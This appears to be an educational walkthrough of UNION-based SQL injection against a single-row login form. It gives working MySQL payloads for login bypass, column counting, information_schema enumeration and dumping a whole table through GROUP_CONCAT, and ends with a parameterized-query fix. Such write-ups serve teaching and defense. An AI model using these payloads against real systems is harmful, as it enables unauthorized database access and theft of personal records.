# Blind UNION-Based SQL Injection Methodology

A walkthrough for extracting full table contents from a login form that only
ever renders a single result row, without any access to source code.

## Target Behavior

- Login form with `student_id` and `password` fields, submitted via GET.
- On submit, the app runs a query like:
  ```sql
  SELECT * FROM result WHERE student_id = '<input>' AND password = '<input>'
  ```
- The response always renders **exactly one row** (or one empty row), even
  when multiple rows match — because the app code only reads `rows[0]`.
- SQL errors are silently caught server-side and produce a blank row, with
  no visible error message.

This combination (single-row rendering + silent error handling) is what
makes the attack non-obvious: naive injection payloads that don't match the
column count just look like "nothing happened."

## Step 1 — Confirm the injection point

Try a classic always-true payload:
```
student_id: garbage' or '1'='1
password:   anything
```
If a row comes back that doesn't correspond to a real login attempt, the
input is being concatenated unsafely into the SQL string.

## Step 2 — Determine the column count with `ORDER BY`

Since errors are swallowed, you can't read them directly — but you can
detect success/failure by whether a real row renders.

```
' OR '1'='1' ORDER BY 1#
' OR '1'='1' ORDER BY 2#
' OR '1'='1' ORDER BY 3#
...
```
Increase the number until the response goes from a real row back to blank.
The last value that still returns data is the true column count of the
`SELECT *` query.

> Note: use `#` as the comment marker for MySQL — it needs no trailing
> space, unlike `--` which requires one and is easy to lose via copy/paste
> or URL encoding.

## Step 3 — Map output positions to rendered fields

The app only displays two visible values (Name, CGPA), built from named
fields like `row.first_name`, `row.last_name`, `row.cgpa`. You don't need
the source to find which UNION column position feeds which field — probe
with distinct markers:

```
' UNION SELECT 1,'POS2','POS3',4,'POS5'#
```
(pad with the correct number of columns from Step 2)

Whichever marker strings appear in the Name/CGPA cells tell you which
positions the render logic is reading from.

## Step 4 — Enumerate table names (no prior schema knowledge needed)

Using the position discovered in Step 3 that feeds a visible field, wrap a
subquery around `information_schema.tables` with `GROUP_CONCAT` to squish
every table name into the single row the app will render:

```
' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name SEPARATOR ', ')
  FROM information_schema.tables WHERE table_schema=database()),'',4,5#
```

## Step 5 — Enumerate column names for a target table

Same technique, pointed at `information_schema.columns`:

```
' UNION SELECT 1,(SELECT GROUP_CONCAT(column_name SEPARATOR ', ')
  FROM information_schema.columns WHERE table_name='result'),'',4,5#
```

## Step 6 — Dump all rows into the single visible row

Once real column names are known, use a correlated subquery with
`GROUP_CONCAT` in the position that feeds the visible field, so that
*every* row's data gets aggregated into the one row the app actually
displays:

```
' UNION SELECT 1,
  (SELECT GROUP_CONCAT(first_name,' ',last_name,':',cgpa SEPARATOR ' | ')
   FROM result),
  '',4,5#
```

Result: the Name cell renders every student's `name:cgpa`, pipe-separated,
even though the frontend only ever displays `rows[0]`.

## Key Takeaways

- **Single-row rendering is not a real mitigation.** `GROUP_CONCAT` turns
  any number of rows into one string, defeating a `rows[0]`-only display.
- **Silent error handling hides mistakes, not vulnerabilities.** A blank
  result on a bad payload usually just means the column count or aliasing
  is wrong — keep adjusting rather than assuming the input is filtered.
- **`information_schema` makes prior schema knowledge unnecessary.** Table
  and column names can be enumerated purely through the injection point.
- **Root cause:** string concatenation of user input directly into SQL.
  The fix is parameterized queries / prepared statements, never string
  interpolation of `req.query` values into a SQL string.

## Remediation

```js
// Vulnerable
const sql = `SELECT * FROM result WHERE student_id = '${student_id}' AND password = '${password}'`;

// Fixed — parameterized query
const sql = `SELECT * FROM result WHERE student_id = ? AND password = ?`;
const [rows] = await pool.query(sql, [student_id, password]);
```
Parameterized queries ensure user input is always treated as data, never
as part of the SQL syntax, which closes off this entire class of attack.
